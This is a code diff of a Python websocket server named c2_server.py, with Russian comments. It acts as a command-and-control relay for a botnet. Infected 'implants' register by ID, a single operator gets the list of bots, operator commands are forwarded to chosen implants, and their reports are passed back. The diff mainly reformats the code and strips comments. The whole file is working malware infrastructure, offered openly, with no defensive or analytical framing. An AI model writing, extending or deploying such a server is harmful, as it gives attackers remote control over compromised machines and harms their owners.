@@ -1,12 +1,16 @@
 # --- ФАЙЛ: c2_server.py (Финальный, "тупой" почтальон) ---
-import asyncio, json, os
+import asyncio
+import json
+import os
 from aiohttp import web
 
 IMPLANTS, OPERATOR = {}, None
 
 async def broadcast_bot_list():
-  if OPERATOR and not OPERATOR.closed:
-    await OPERATOR.send_json({'type': 'bot_list', 'data': [{'id': bot_id} for bot_id in IMPLANTS.keys()]})
+    if OPERATOR and not OPERATOR.closed:
+        # Отправляем детальный список, как того ожидает панель v6.6
+        bot_list_with_details = [{'id': bot_id} for bot_id in IMPLANTS.keys()]
+        await OPERATOR.send_json({'type': 'bot_list', 'data': bot_list_with_details})
 
 async def websocket_handler(request):
     global OPERATOR, IMPLANTS
@@ -15,7 +19,6 @@ async def websocket_handler(request):
     client_type, client_id = None, None
 
     try:
-        # Имплант должен представиться в течение 30 секунд
         initial_msg = await ws.receive_json(timeout=30.0)
         client_type = initial_msg.get('type')
 
@@ -28,7 +31,7 @@ async def websocket_handler(request):
             IMPLANTS[client_id] = ws
             print(f"[+] Имплант на связи: {client_id}")
             await broadcast_bot_list()
-        else: # Неизвестный тип или имплант без ID
+        else:
             await ws.close()
             return ws
 
@@ -36,19 +39,18 @@ async def websocket_handler(request):
             if msg.type != web.WSMsgType.TEXT or msg.data == 'pong':
                 continue
 
-            try: data = json.loads(msg.data)
-            except: continue
+            try:
+                data = json.loads(msg.data)
+            except:
+                continue
 
-            # --- ЛОГИКА "ТУПОГО ПОЧТАЛЬОНА" ---
             if client_type == 'operator':
                 target_id = data.get('target_id')
                 if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
-                    # Просто пересылаем приказ импланту
                     await IMPLANTS[target_id].send_json(data)
 
             elif client_type == 'implant':
                 if OPERATOR and not OPERATOR.closed:
-                    # Просто пересылаем отчет от импланта оператору
                     data['bot_id'] = client_id
                     await OPERATOR.send_json(data)
 
